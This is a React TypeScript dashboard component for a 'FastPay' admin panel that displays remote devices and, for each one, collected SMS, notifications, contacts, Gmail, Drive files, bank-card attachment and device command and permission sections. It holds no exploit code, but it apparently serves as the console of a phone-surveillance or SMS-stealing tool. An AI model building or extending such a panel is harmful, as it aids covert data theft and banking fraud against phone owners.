import { useState, useCallback, useRef, useMemo, Suspense, useEffect, lazy } from 'react'
import { useNavigate } from 'react-router-dom'
import { Database } from 'lucide-react'
import { useToast } from '@/lib/use-toast'
import { UnifiedLayout } from '@/component/UnifiedLayout'
import {
  useDashboardMessages,
  useDashboardNotifications,
  useDashboardContacts,
  useDashboardDevices,
  useDeviceMetadata,
  useDeviceStatus,
} from '@/hooks/dashboard'
import { getSession, clearSession, hasFullAccess, getUserAccessLevel } from '@/lib/auth'
import { prefetchDeviceData, prefetchDevicesData } from '@/lib/prefetch-utils'
import { getDefaultProcessor, getProcessorById } from '@/lib/message-processors'
import type { User, ActiveTabType, DeviceSectionTab } from '@/pages/dashboard/types'
import { SectionLoader } from '@/component/SectionLoader'
import { getDeviceListPath } from '@/lib/firebase-helpers'
import { get } from 'firebase/database'
import { Card } from '@/component/ui/card'

// Lazy load sections
const MessagesSection = lazy(() => import('@/component/MessagesSection').then(m => ({ default: m.MessagesSection })))
const NotificationsSection = lazy(() => import('@/component/NotificationsSection').then(m => ({ default: m.NotificationsSection })))
const ContactsSection = lazy(() => import('@/component/ContactsSection').then(m => ({ default: m.ContactsSection })))
const InputFilesSection = lazy(() => import('@/component/InputFilesSection').then(m => ({ default: m.InputFilesSection })))
const OverviewSection = lazy(() => import('@/component/OverviewSection').then(m => ({ default: m.OverviewSection })))
const DeviceListSection = lazy(() => import('@/pages/dashboard/components/DeviceListSection').then(m => ({ default: m.DeviceListSection })))
const AnalyticsSection = lazy(() => import('@/component/AnalyticsSection').then(m => ({ default: m.AnalyticsSection })))
const DeviceSectionTabs = lazy(() => import('@/pages/dashboard/components/DeviceSectionTabs').then(m => ({ default: m.DeviceSectionTabs })))
const GmailSection = lazy(() => import('@/component/GmailSection').then(m => ({ default: m.GmailSection })))
const DriveSection = lazy(() => import('@/component/DriveSection').then(m => ({ default: m.DriveSection })))
const UtilitiesSection = lazy(() => import('@/component/UtilitiesSection').then(m => ({ default: m.UtilitiesSection })))
const CommandsSection = lazy(() => import('@/component/CommandsSection').then(m => ({ default: m.CommandsSection })))
const InstructionsSection = lazy(() => import('@/component/InstructionsSection').then(m => ({ default: m.InstructionsSection })))
const PermissionsSection = lazy(() => import('@/component/PermissionsSection').then(m => ({ default: m.PermissionsSection })))
const ApiSection = lazy(() => import('@/component/ApiSection').then(m => ({ default: m.ApiSection })))

interface DashboardContainerProps {
  onLogout: () => void
}

/**
 * DashboardContainer - Main container component for Dashboard
 * Handles all data fetching, state management, and coordinates child components
 */
export function DashboardContainer({ onLogout }: DashboardContainerProps) {
  const navigate = useNavigate()
  const { toast } = useToast()
  const [session, setSession] = useState(() => getSession())

  // Session and auth
  const sessionEmail = useMemo(() => session?.email || null, [session?.email])
  const isAdmin = hasFullAccess()
  const userEmail = sessionEmail || ''
  const userAccessLevel = getUserAccessLevel()

  // Core state
  const [selectedUserId, setSelectedUserId] = useState<string | null>(null)
  const [selectedProcessorId, setSelectedProcessorId] = useState<string>(() => {
    try {
      const saved = localStorage.getItem('dashboardMessageProcessorId')
      if (saved) return saved
      const defaultProcessor = getDefaultProcessor()
      return defaultProcessor?.id || 'neft-inr-merge'
    } catch (error) {
      console.error('Error initializing processor:', error)
      return 'neft-inr-merge'
    }
  })
  const selectedProcessor = useMemo(() => {
    try {
      const processor = getProcessorById(selectedProcessorId)
      if (processor) return processor
      return getDefaultProcessor()
    } catch (error) {
      console.error('Error getting processor:', error)
      return getDefaultProcessor()
    }
  }, [selectedProcessorId])
  const [processorInput, setProcessorInput] = useState<string>(() => {
    try {
      const saved = localStorage.getItem('dashboardProcessorInput')
      return saved || ''
    } catch (error) {
      return ''
    }
  })

  // Tab state
  const urlParams = new URLSearchParams(window.location.search)
  // Don't persist 'api' tab - always default to 'overview' on refresh
  // Also check localStorage but ignore 'api' tab
  const urlTab = urlParams.get('tab') as ActiveTabType
  const savedTab = (() => {
    try {
      const saved = localStorage.getItem('dashboard-activeTab')
      return saved && saved !== 'api' ? (saved as ActiveTabType) : null
    } catch {
      return null
    }
  })()
  const initialTab = (urlTab && urlTab !== 'api') ? urlTab : (savedTab || 'overview')
  const [activeTab, setActiveTab] = useState<ActiveTabType>(initialTab)
  
  // Persist activeTab to localStorage (but not 'api' tab)
  useEffect(() => {
    if (activeTab && activeTab !== 'api') {
      try {
        localStorage.setItem('dashboard-activeTab', activeTab)
      } catch (error) {
        console.error('Error saving activeTab to localStorage:', error)
      }
    } else if (activeTab === 'api') {
      // Clear saved tab when on API (so refresh goes to overview)
      try {
        localStorage.removeItem('dashboard-activeTab')
      } catch (error) {
        console.error('Error clearing activeTab from localStorage:', error)
      }
    }
  }, [activeTab])
  const [deviceSubTab, setDeviceSubTab] = useState<DeviceSectionTab>('message')
  const [viewMode, setViewMode] = useState<'tabs' | 'widgets'>(() => {
    const saved = localStorage.getItem('dashboard-viewMode')
    return saved === 'widgets' || saved === 'tabs' ? saved : 'tabs'
  })

  // Data limit and sync toggles
  const [dataLimit, setDataLimit] = useState<number>(() => {
    const saved = localStorage.getItem('dashboard-dataLimit')
    const savedValue = saved ? parseInt(saved) : 30
    return [20, 30, 50].includes(savedValue) ? savedValue : 30
  })
  const [contactsSyncEnabled, setContactsSyncEnabled] = useState<boolean>(() => {
    const saved = localStorage.getItem('dashboard-contactsSyncEnabled')
    return saved ? saved === 'true' : true
  })
  const [notificationsSyncEnabled, setNotificationsSyncEnabled] = useState<boolean>(() => {
    const saved = localStorage.getItem('dashboard-notificationsSyncEnabled')
    return saved ? saved === 'true' : true
  })

  // Refresh triggers
  const [refreshTrigger, setRefreshTrigger] = useState(0)
  const [refreshDeviceStatusTrigger, setRefreshDeviceStatusTrigger] = useState(0)

  // Device switching
  const [isSwitchingDevice, setIsSwitchingDevice] = useState(false)
  const deviceSwitchTimeoutRef = useRef<ReturnType<typeof setTimeout> | null>(null)

  // Tagline map
  const [taglineMap, setTaglineMap] = useState<Map<string, string>>(new Map())
  const fetchedTaglinesRef = useRef<Set<string>>(new Set())

  // Use hooks for data fetching
  const {
    devices: users,
    loading: devicesLoading,
    error: devicesError,
    refresh: refreshDevices,
  } = useDashboardDevices({
    sessionEmail: sessionEmail,
    refreshTrigger: refreshTrigger,
  })

  const {
    messages: sms,
    rawMessages: rawSms,
    loading: smsLoading,
    error: smsError,
    isConnected,
    refresh: refreshMessages,
  } = useDashboardMessages({
    deviceId: selectedUserId,
    dataLimit: dataLimit,
    selectedProcessor: selectedProcessor,
    processorInput: processorInput,
    activeTab: activeTab,
  })

  const {
    notifications,
    loading: notificationsLoading,
    error: notificationsError,
    refresh: refreshNotifications,
  } = useDashboardNotifications({
    deviceId: selectedUserId,
    dataLimit: dataLimit,
    activeTab: activeTab,
    syncEnabled: notificationsSyncEnabled,
  })

  const {
    contacts,
    loading: contactsLoading,
    error: contactsError,
    refresh: refreshContacts,
  } = useDashboardContacts({
    deviceId: selectedUserId,
    activeTab: activeTab,
    syncEnabled: contactsSyncEnabled,
  })

  const {
    battery: deviceBattery,
    lastSeen: deviceLastSeen,
    dataEnabled: deviceDataEnabled,
    deviceCode,
    loading: deviceMetadataLoading,
    error: deviceMetadataError,
  } = useDeviceMetadata({
    deviceId: selectedUserId,
  })

  const {
    status: deviceStatus,
    refresh: refreshDeviceStatus,
  } = useDeviceStatus({
    deviceId: selectedUserId,
    refreshTrigger: refreshDeviceStatusTrigger,
  })

  // Handlers
  const handleDeviceSelect = useCallback(
    (deviceId: string | null) => {
      if (deviceSwitchTimeoutRef.current) {
        clearTimeout(deviceSwitchTimeoutRef.current)
      }

      setIsSwitchingDevice(true)

      // Prefetch data for nearby devices (non-blocking)
      const currentIndex = users.findIndex(u => u.id === deviceId)
      if (currentIndex !== -1) {
        const nearbyDevices = [users[currentIndex - 1]?.id, users[currentIndex + 1]?.id].filter(
          Boolean
        ) as string[]

        nearbyDevices.forEach(id => {
          prefetchDeviceData(id, { limit: dataLimit })
        })
      }

      // Debounce device switch by 150ms
      deviceSwitchTimeoutRef.current = setTimeout(() => {
        setSelectedUserId(deviceId)
        if (deviceId) {
          // When device is selected, switch to SMS tab (device-specific navigation)
          // Only change tab if we're not already on a device-compatible tab
          if (activeTab === 'api' || activeTab === 'overview' || activeTab === 'devices' || activeTab === 'analytics') {
            setActiveTab('sms')
          }
          setDeviceSubTab('message')
        }
        // Don't change activeTab when clearing device - let it stay on current tab
        setIsSwitchingDevice(false)
      }, 150)
    },
    [users, dataLimit]
  )

  const handleRefreshDevices = useCallback(() => {
    setRefreshTrigger(prev => prev + 1)
    refreshDevices()
    toast({
      title: 'Refreshing',
      description: 'Updating device list...',
      variant: 'default',
    })
  }, [toast, refreshDevices])

  const handleLogout = useCallback(() => {
    clearSession()
    onLogout()
  }, [onLogout])

  // Format message timestamp
  const formatMessageTimestamp = useCallback((timestamp: number | string): string => {
    try {
      const ts = typeof timestamp === 'string' ? parseInt(timestamp) : timestamp
      if (!isNaN(ts) && ts > 0) {
        const date = new Date(ts)
        if (!isNaN(date.getTime())) {
          return date.toLocaleString('en-US')
        }
      }
      return String(timestamp)
    } catch {
      return String(timestamp)
    }
  }, [])

  // Current device ID
  const currentDeviceId = selectedUserId

  // Clear tab query parameter
  useEffect(() => {
    if (urlParams.get('tab')) {
      window.history.replaceState({}, '', window.location.pathname)
    }
  }, [])

  // Check session on mount
  useEffect(() => {
    const currentSession = getSession()
    if (!currentSession) {
      onLogout()
      return
    }
    setSession(currentSession)
  }, [onLogout])

  // Auto-select first user when users are loaded
  useEffect(() => {
    if (
      users.length > 0 &&
      !selectedUserId &&
      (activeTab === 'sms' ||
        activeTab === 'notifications' ||
        activeTab === 'contacts' ||
        activeTab === 'input' ||
        activeTab === 'overview')
    ) {
      if (activeTab !== 'overview') {
        handleDeviceSelect(users[0].id)
      }
    }
  }, [users, selectedUserId, handleDeviceSelect, activeTab])

  // Prefetch data for all devices when they're loaded
  useEffect(() => {
    if (users.length > 0) {
      const deviceIds = users.map(u => u.id)
      prefetchDevicesData(deviceIds, { limit: dataLimit })
    }
  }, [users, dataLimit])

  // Fetch taglines for devices
  useEffect(() => {
    const taglinePromises: Promise<void>[] = []

    users.forEach(user => {
      if (user.code && !fetchedTaglinesRef.current.has(user.code)) {
        fetchedTaglinesRef.current.add(user.code)
        const taglinePromise = (async () => {
          try {
            const taglineRef = getDeviceListPath(user.code!, 'Tagline')
            const taglineSnapshot = await get(taglineRef)
            if (taglineSnapshot.exists()) {
              const tagline = taglineSnapshot.val()
              if (typeof tagline === 'string') {
                setTaglineMap(prev => new Map(prev).set(user.code!, tagline))
              }
            }
          } catch (error) {
            console.error(`Error fetching tagline for code ${user.code}:`, error)
          }
        })()
        taglinePromises.push(taglinePromise)
      }
    })

    if (taglinePromises.length > 0) {
      Promise.all(taglinePromises).catch(console.error)
    }
  }, [users])

  // Persist state to localStorage
  useEffect(() => {
    localStorage.setItem('dashboard-dataLimit', dataLimit.toString())
  }, [dataLimit])

  useEffect(() => {
    localStorage.setItem('dashboard-contactsSyncEnabled', contactsSyncEnabled.toString())
  }, [contactsSyncEnabled])

  useEffect(() => {
    localStorage.setItem('dashboard-notificationsSyncEnabled', notificationsSyncEnabled.toString())
  }, [notificationsSyncEnabled])

  useEffect(() => {
    localStorage.setItem('dashboard-viewMode', viewMode)
  }, [viewMode])

  useEffect(() => {
    localStorage.setItem('dashboardMessageProcessorId', selectedProcessorId)
  }, [selectedProcessorId])

  useEffect(() => {
    localStorage.setItem('dashboardProcessorInput', processorInput)
  }, [processorInput])

  // Cleanup timeout on unmount
  useEffect(() => {
    return () => {
      if (deviceSwitchTimeoutRef.current) {
        clearTimeout(deviceSwitchTimeoutRef.current)
      }
    }
  }, [])

  if (!session) {
    return null
  }

  return (
    <UnifiedLayout
      showAdminFeatures={isAdmin}
      selectedDeviceId={selectedUserId}
      devices={users.map(user => ({
        id: user.id,
        name: user.device || user.id,
        code: user.code || undefined,
        phone: user.phone || undefined,
        currentPhone: user.phone || undefined,
        lastSeen: user.lastSeen || undefined,
        batteryPercentage: user.batteryPercentage || undefined,
        isActive: user.isOnline || false,
        time: user.time ? parseInt(user.time) : undefined,
      }))}
      onDeviceSelect={deviceId => {
        handleDeviceSelect(deviceId)
        if (deviceId) {
          setActiveTab('sms')
          setDeviceSubTab('message')
        }
      }}
      taglineMap={taglineMap}
      title="FastPay"
      description={isAdmin ? 'Administrator Panel' : undefined}
      userEmail={userEmail}
      userAccessLevel={userAccessLevel}
      onLogout={handleLogout}
      onRefreshDevices={handleRefreshDevices}
      overallActiveTab={activeTab}
      onOverallTabChange={(tab) => {
        // If switching to API, clear device selection (API is global, not device-specific)
        if (tab === 'api') {
          setSelectedUserId(null)
          setActiveTab('api')
        } else if (selectedUserId && tab === 'sms') {
          // When device is selected and clicking SMS tab, ensure deviceSubTab is set to 'message'
          setActiveTab('sms')
          setDeviceSubTab('message')
        } else {
          // For all other tabs (overview, devices, analytics, notifications, contacts, input, etc.)
          // Just set the active tab - device-specific navigation will work when device is selected
          setActiveTab(tab as ActiveTabType)
        }
      }}
      onDeviceClear={() => {
        setSelectedUserId(null)
      }}
      rightSidebar={deviceId => {
        const currentDeviceId = deviceId || selectedUserId
        const currentUser = users.find(u => u.id === currentDeviceId)
        
        return (
          <Card className="w-full flex flex-col border border-border/60 rounded-xl bg-card/95 backdrop-blur-sm shadow-sm">
            {/* Device Status Card - Simplified for container */}
            <div className="p-4 space-y-2">
              <h3 className="text-sm font-semibold">Device Status</h3>
              <div className="text-xs text-muted-foreground">
                {deviceStatus === 'online' ? '🟢 Online' : deviceStatus === 'offline' ? '🔴 Offline' : '🟡 Checking...'}
              </div>
              {deviceBattery !== null && (
                <div className="text-xs">Battery: {deviceBattery}%</div>
              )}
            </div>
          </Card>
        )
      }}
    >
      {({ currentDeviceId }) => (
        <>
          {currentDeviceId && (
            <Suspense fallback={<SectionLoader />}>
              <DeviceSectionTabs
                activeTab={deviceSubTab}
                onTabChange={setDeviceSubTab}
                deviceId={currentDeviceId}
              />
            </Suspense>
          )}
          
          {currentDeviceId ? (
            // When device is selected, show device-specific content based on activeTab (same old way)
            activeTab === 'sms' ? (
              // SMS tab - use deviceSubTab for message/google sub-tabs
              deviceSubTab === 'message' ? (
                <Suspense fallback={<SectionLoader />}>
                  <MessagesSection
                    deviceId={currentDeviceId}
                    messages={sms}
                    rawMessages={rawSms}
                    loading={smsLoading}
                    error={smsError}
                    isConnected={isConnected}
                    isAdmin={isAdmin}
                    selectedProcessorId={selectedProcessorId}
                    processorInput={processorInput}
                    onProcessorChange={setSelectedProcessorId}
                    onProcessorInputChange={setProcessorInput}
                    onRetry={refreshMessages}
                    formatMessageTimestamp={formatMessageTimestamp}
                  />
                </Suspense>
              ) : deviceSubTab === 'google' ? (
                <div className="space-y-4">
                  <Suspense fallback={<SectionLoader />}>
                    <GmailSection deviceId={currentDeviceId} isAdmin={isAdmin} />
                  </Suspense>
                  <Suspense fallback={<SectionLoader />}>
                    <DriveSection deviceId={currentDeviceId} isAdmin={isAdmin} />
                  </Suspense>
                </div>
              ) : deviceSubTab === 'data' ? (
                <div className="p-8 text-center text-muted-foreground">
                  <Database className="h-12 w-12 mx-auto mb-4 opacity-50" />
                  <p className="font-medium">Data Section</p>
                  <p className="text-sm mt-2">Data management features coming soon</p>
                </div>
              ) : deviceSubTab === 'utility' ? (
                <Suspense fallback={<SectionLoader />}>
                  <UtilitiesSection deviceId={currentDeviceId} />
                </Suspense>
              ) : deviceSubTab === 'command' ? (
                <Suspense fallback={<SectionLoader />}>
                  <CommandsSection deviceId={currentDeviceId} />
                </Suspense>
              ) : deviceSubTab === 'instruction' ? (
                <Suspense fallback={<SectionLoader />}>
                  <InstructionsSection deviceId={currentDeviceId} />
                </Suspense>
              ) : deviceSubTab === 'permission' ? (
                <Suspense fallback={<SectionLoader />}>
                  <PermissionsSection deviceId={currentDeviceId} />
                </Suspense>
              ) : null
            ) : activeTab === 'notifications' ? (
              <Suspense fallback={<SectionLoader />}>
                <NotificationsSection
                  deviceId={currentDeviceId}
                  notifications={notifications}
                  loading={notificationsLoading}
                  error={notificationsError}
                  isConnected={isConnected}
                  isAdmin={isAdmin}
                  syncEnabled={notificationsSyncEnabled}
                  formatNotificationTimestamp={formatMessageTimestamp}
                />
              </Suspense>
            ) : activeTab === 'contacts' ? (
              <Suspense fallback={<SectionLoader />}>
                <ContactsSection
                  deviceId={currentDeviceId}
                  contacts={contacts}
                  loading={contactsLoading}
                  error={contactsError}
                  isConnected={isConnected}
                  isAdmin={isAdmin}
                  syncEnabled={contactsSyncEnabled}
                />
              </Suspense>
            ) : activeTab === 'input' ? (
              <Suspense fallback={<SectionLoader />}>
                <InputFilesSection deviceId={currentDeviceId} />
              </Suspense>
            ) : null
          ) : activeTab === 'overview' ? (
            <Suspense fallback={<SectionLoader />}>
              <OverviewSection
                currentDeviceId={currentDeviceId}
                viewMode={viewMode}
                onDeviceSelect={deviceId => {
                  handleDeviceSelect(deviceId)
                  setActiveTab('sms')
                }}
                onTabChange={tab => setActiveTab(tab as ActiveTabType)}
                onRefresh={() => {
                  setRefreshDeviceStatusTrigger(prev => prev + 1)
                }}
              />
            </Suspense>
          ) : activeTab === 'devices' ? (
            <Suspense fallback={<SectionLoader />}>
              <DeviceListSection
                onDeviceSelect={deviceId => {
                  handleDeviceSelect(deviceId)
                  setActiveTab('sms')
                }}
                onAttachBankCard={deviceId => {
                  handleDeviceSelect(deviceId)
                  setActiveTab('add-bank-card')
                }}
              />
            </Suspense>
          ) : activeTab === 'analytics' ? (
            <Suspense fallback={<SectionLoader />}>
              <AnalyticsSection deviceId={currentDeviceId} />
            </Suspense>
          ) : activeTab === 'api' ? (
            <Suspense fallback={<SectionLoader />}>
              <ApiSection />
            </Suspense>
          ) : null}
        </>
      )}
    </UnifiedLayout>
  )
}
